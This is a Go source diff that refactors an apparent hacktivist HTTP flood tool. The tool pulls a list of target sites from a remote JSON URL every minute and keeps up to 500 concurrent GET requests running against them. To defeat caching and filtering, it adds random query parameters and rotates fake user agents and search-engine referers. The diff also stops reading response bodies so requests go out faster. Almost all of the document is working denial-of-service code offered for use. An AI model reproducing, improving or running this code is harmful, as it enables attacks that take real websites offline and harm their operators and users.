@@ -11,9 +11,11 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	ua "github.com/wux1an/fake-useragent"
 )
 
-type StrikeItem struct {
+type strikeItem struct {
 	Id           int         `json:"id"`
 	Url          string      `json:"url"`
 	Page         string      `json:"page"`
@@ -24,21 +26,27 @@ type StrikeItem struct {
 	Port         interface{} `json:"port"`
 }
 
-// type proxyItem struct {
-// 	sites   int
-// 	ip   string
-// 	auth string
-// }
+func (si *strikeItem) PagePayload() string {
+	var paramJoiner string
+	if strings.ContainsRune(si.Page, '?') {
+		paramJoiner = "&"
+	} else {
+		paramJoiner = "?"
+	}
 
-// type strikeItems struct {
-// 	sites  []strikeItem
-// }
+	return fmt.Sprintf("%s%s%s=%s", si.Page, paramJoiner, buildblock(rand.Intn(7)+3), buildblock(rand.Intn(7)+3))
+}
+
+type Statistics map[string]struct {
+	failCnt   int
+	succCnt   int
+	startTime time.Time
+}
 
 const (
-	// strikeUrl             = "https://gitlab.com/cto.endel/atack_hosts/-/raw/master/sites.json"
 	strikeUrl             = "https://hutin-puy.nadom.app/sites.json"
 	strikeRefreshInterval = 60 * time.Second
-	// strikeRefreshInterval = 15 * time.Second
+	acceptCharset         = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 	// strikeRefreshing uint8 = iota
 	// strikeListReady
@@ -46,39 +54,41 @@ const (
 )
 
 var (
-	strikeList    []StrikeItem
-	noProxyClient *http.Client
-	proxyClient   *http.Client
+	strikeList                 []strikeItem
+	limiter, refresher         chan struct{}
+	noProxyClient, proxyClient *http.Client
+
+	headersReferers []string = []string{
+		"http://www.google.com/?q=",
+		"http://www.usatoday.com/search/results?q=",
+		"http://engadget.search.aol.com/search?q=",
+		"http://www.google.ru/?hl=ru&q=",
+		"http://yandex.ru/yandsearch?text=",
+	}
 )
 
 func main() {
-	var limiter chan struct{} = make(chan struct{}, 500)
-	var refresher chan struct{} = make(chan struct{}, 1)
+	initClients()
 
-	tr := http.DefaultTransport.(*http.Transport).Clone()
-	tr.Proxy = nil
-	noProxyClient = &http.Client{Transport: tr}
+	limiter = make(chan struct{}, 500)
+	refresher = make(chan struct{}, 1)
 
-	tr2 := http.DefaultTransport.(*http.Transport).Clone()
-	tr2.IdleConnTimeout = 8 * time.Second
-	tr2.DialContext = (&net.Dialer{
-		Timeout:   4 * time.Second,
-		KeepAlive: 30 * time.Second,
-	}).DialContext
-	proxyClient = &http.Client{Transport: tr2}
-
-	if err := fetchStrikeList(refresher); err != nil {
+	if err := fetchStrikeList(); err != nil {
 		fmt.Printf("failed to fetch Strike list: %v\n", err)
 		os.Exit(9)
 	}
-	startStrikeListRefresher(refresher)
+	startStrikeListRefresher()
+
+	ua.Random() // NOTE: init cache at this point. bud noticed below...
 
 	for {
-		refresher <- struct{}{} // locks a slot
+		time.Sleep(100 * time.Millisecond)
+		refresher <- struct{}{}
 		// fmt.Println("start processing strikeList")
 
-		go func(r, l chan struct{}) {
-			defer func() { <-r }() // frees a slot
+		go func() {
+			defer func() { <-refresher }()
+
 			for _, strike := range strikeList {
 				atack, ok := strike.Atack.(bool)
 				if !ok {
@@ -90,23 +100,21 @@ func main() {
 					continue
 				}
 
-				l <- struct{}{} // locks a slot
-				go func(huilo StrikeItem, l chan struct{}) {
-					defer func() { <-l }() // frees a slot
+				limiter <- struct{}{}
+				go func(huilo strikeItem) {
+					defer func() { <-limiter }()
 					_ = greetingsTorussiaWarShip(huilo)
-				}(strike, l)
+				}(strike)
 
 			}
 			// fmt.Println("completed processing strikeList")
-		}(refresher, limiter)
+		}()
 	}
 }
 
-func fetchStrikeList(r chan struct{}) error {
-	r <- struct{}{} // locks a slot
-	defer func() {
-		<-r // frees a slot
-	}()
+func fetchStrikeList() error {
+	refresher <- struct{}{}
+	defer func() { <-refresher }()
 
 	var (
 		body []byte
@@ -139,30 +147,34 @@ func fetchStrikeList(r chan struct{}) error {
 		return fmt.Errorf("failed to parse json of strike list: %v", err)
 	}
 
-	fmt.Printf("* * fetched sites list successfully! %d * *\n", len(strikeList))
+	// time.Sleep(200 * time.Microsecond)
+	fmt.Println("***\t\t\t***")
+	fmt.Printf("* * fetched sites: %d * *\n", len(strikeList))
+	fmt.Println("***\t\t\t***")
 
 	return err
 }
 
-func startStrikeListRefresher(r chan struct{}) {
+func startStrikeListRefresher() {
 	ticker := time.NewTicker(strikeRefreshInterval)
 
-	go func(r chan struct{}) {
+	go func() {
 		for {
 			select {
 			case <-ticker.C:
-				if err := fetchStrikeList(r); err != nil {
-					fmt.Println("failed to fetch string List. retrying...")
+				ticker.Stop()
+				if err := fetchStrikeList(); err != nil {
+					fmt.Println("failed to fetch site List. retrying...")
 					fmt.Println(err.Error())
-					fetchStrikeList(r)
+					fetchStrikeList()
 				}
 				ticker.Reset(strikeRefreshInterval)
 			}
 		}
-	}(r)
+	}()
 }
 
-func greetingsTorussiaWarShip(huilo StrikeItem) error {
+func greetingsTorussiaWarShip(huilo strikeItem) error {
 	req, err := http.NewRequest(http.MethodGet, huilo.PagePayload(), nil)
 	if err != nil {
 		fmt.Printf("couldn't create new request: %v\n", err)
@@ -170,7 +182,7 @@ func greetingsTorussiaWarShip(huilo StrikeItem) error {
 	}
 
 	// req.Header.Add("Content-Type", "application/json")
-	req.Header.Set("User-Agent", headersUseragents[rand.Intn(len(headersUseragents))])
+	req.Header.Set("User-Agent", ua.Random()) // FIXME: it sometimes panics. see another package?
 	req.Header.Set("Cache-Control", "no-cache")
 	req.Header.Set("Accept-Charset", acceptCharset)
 	req.Header.Set("Referer", headersReferers[rand.Intn(len(headersReferers))]+buildblock(rand.Intn(5)+5))
@@ -186,39 +198,14 @@ func greetingsTorussiaWarShip(huilo StrikeItem) error {
 	}
 	defer resp.Body.Close()
 
-	_, err = ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return fmt.Errorf("failed to read ship: %v, %d", err, resp.StatusCode)
-	}
+	// NOTE: do not fetch actual body but reflect on connection instead
+	// _, err = ioutil.ReadAll(resp.Body)
+	// if err != nil {
+	// 	return fmt.Errorf("failed to read ship: %v, %d", err, resp.StatusCode)
+	// }
 
 	return nil
 }
-
-var headersUseragents []string = []string{
-	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
-	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Vivaldi/1.3.501.6",
-	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
-	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
-	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1",
-	"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1",
-	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)",
-	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)",
-	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)",
-	"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)",
-	"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)",
-	"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)",
-	"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51",
-}
-
-var headersReferers []string = []string{
-	"http://www.google.com/?q=",
-	"http://www.usatoday.com/search/results?q=",
-	"http://engadget.search.aol.com/search?q=",
-	"http://www.google.ru/?hl=ru&q=",
-	"http://yandex.ru/yandsearch?text=",
-}
-
-const acceptCharset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
 
 func buildblock(size int) (s string) {
 	var a []rune
@@ -228,13 +215,16 @@ func buildblock(size int) (s string) {
 	return string(a)
 }
 
-func (si *StrikeItem) PagePayload() string {
-	var paramJoiner string
-	if strings.ContainsRune(si.Page, '?') {
-		paramJoiner = "&"
-	} else {
-		paramJoiner = "?"
-	}
+func initClients() {
+	tr := http.DefaultTransport.(*http.Transport).Clone()
+	tr.Proxy = nil
+	noProxyClient = &http.Client{Transport: tr}
 
-	return fmt.Sprintf("%s%s%s=%s", si.Page, paramJoiner, buildblock(rand.Intn(7)+3), buildblock(rand.Intn(7)+3))
+	tr2 := http.DefaultTransport.(*http.Transport).Clone()
+	tr2.IdleConnTimeout = 4 * time.Second
+	tr2.DialContext = (&net.Dialer{
+		Timeout:   2 * time.Second,
+		KeepAlive: 1 * time.Second,
+	}).DialContext
+	proxyClient = &http.Client{Transport: tr2}
 }
